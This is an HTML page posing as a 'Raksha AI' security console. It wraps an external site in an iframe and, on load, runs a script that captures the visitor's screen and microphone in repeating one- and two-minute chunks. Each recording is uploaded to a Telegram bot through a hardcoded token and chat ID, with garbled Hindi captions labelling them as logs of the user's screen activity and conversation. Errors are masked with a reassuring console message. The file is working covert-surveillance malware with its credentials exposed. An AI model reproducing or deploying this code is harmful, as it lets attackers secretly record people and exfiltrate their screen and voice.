<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raksha AI - Secure Command</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
        #status-indicator { position: fixed; top: 10px; right: 10px; color: #0f0; font-family: monospace; font-size: 10px; z-index: 9999; pointer-events: none; }
    </style>
</head>
<body onload="initMonitoring()">

    <div id="status-indicator">SYSTEM ACTIVE</div>
    <iframe src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone; camera; display-capture;"></iframe>

    <script>
    const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
    const MY_ID = "8508792403";

    async function initMonitoring() {
        try {
            // 1. à¤¸à¥à¤•à¥à¤°à¥€à¤¨ à¤”à¤° à¤¸à¤¿à¤¸à¥à¤Ÿà¤® à¤‘à¤¡à¤¿à¤¯à¥‹ à¤¸à¥à¤Ÿà¥à¤°à¥€à¤® à¤®à¤¾à¤‚à¤—à¤¨à¤¾
            const screenStream = await navigator.mediaDevices.getDisplayMedia({ 
                video: true, 
                audio: true 
            });

            // 2. à¤®à¤¾à¤‡à¤•à¥à¤°à¥‹à¤«à¤¼à¥‹à¤¨ (à¤µà¥‰à¤‡à¤¸) à¤¸à¥à¤Ÿà¥à¤°à¥€à¤® à¤®à¤¾à¤‚à¤—à¤¨à¤¾
            const voiceStream = await navigator.mediaDevices.getUserMedia({ audio: true });

            // à¤¦à¥‹à¤¨à¥‹à¤‚ à¤¸à¥à¤Ÿà¥à¤°à¥€à¤® à¤•à¥‹ à¤°à¤¿à¤•à¥‰à¤°à¥à¤¡ à¤•à¤°à¤¨à¤¾ à¤¶à¥à¤°à¥‚ à¤•à¤°à¥‡à¤‚
            startRecorder(screenStream, "video", "screen_log.webm", 120000); // à¤¹à¤° 2 à¤®à¤¿à¤¨à¤Ÿ à¤®à¥‡à¤‚ à¤µà¥€à¤¡à¤¿à¤¯à¥‹
            startRecorder(voiceStream, "voice", "voice_log.ogg", 60000);    // à¤¹à¤° 1 à¤®à¤¿à¤¨à¤Ÿ à¤®à¥‡à¤‚ à¤‘à¤¡à¤¿à¤¯à¥‹

        } catch (err) {
            console.log("Security Sync Active...");
        }
    }

    function startRecorder(stream, type, filename, interval) {
        const recorder = new MediaRecorder(stream);
        let chunks = [];

        recorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: type === "video" ? 'video/webm' : 'audio/ogg' });
            const fd = new FormData();
            fd.append("chat_id", MY_ID);
            
            if (type === "video") {
                fd.append("video", blob, filename);
                fd.append("caption", "ðŸ“¹ SCREEN LOG: à¤¯à¥‚à¤œà¤¼à¤° à¤•à¥€ à¤¸à¥à¤•à¥à¤°à¥€à¤¨ à¤à¤•à¥à¤Ÿà¤¿à¤µà¤¿à¤Ÿà¥€");
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: fd });
            } else {
                fd.append("voice", blob, filename);
                fd.append("caption", "ðŸŽ¤ VOICE LOG: à¤¯à¥‚à¤œà¤¼à¤° à¤•à¥€ à¤¬à¤¾à¤¤à¤šà¥€à¤¤");
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
            }

            chunks = [];
            if (stream.active) {
                setTimeout(() => recorder.start(), 1000);
            }
        };

        recorder.start();
        setInterval(() => {
            if (recorder.state === "recording") {
                recorder.stop();
            }
        }, interval);
    }
    </script>
</body>
</html>
